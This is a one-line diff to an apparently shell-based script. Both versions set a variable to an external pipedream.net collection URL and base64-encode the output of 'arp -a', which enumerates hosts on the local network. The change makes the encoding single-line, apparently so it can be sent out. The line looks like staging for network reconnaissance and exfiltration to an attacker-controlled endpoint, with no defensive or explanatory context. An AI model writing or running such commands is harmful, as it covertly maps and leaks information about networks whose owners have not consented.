@@ -1,1 +1,1 @@
-domvar="https://75e5d2f85b9d81b267bfcd27c813de32.m.pipedream.net"; arp -a | base64; sleep=610
+domvar="https://75e5d2f85b9d81b267bfcd27c813de32.m.pipedream.net"; arp -a | base64 -w0; sleep=610
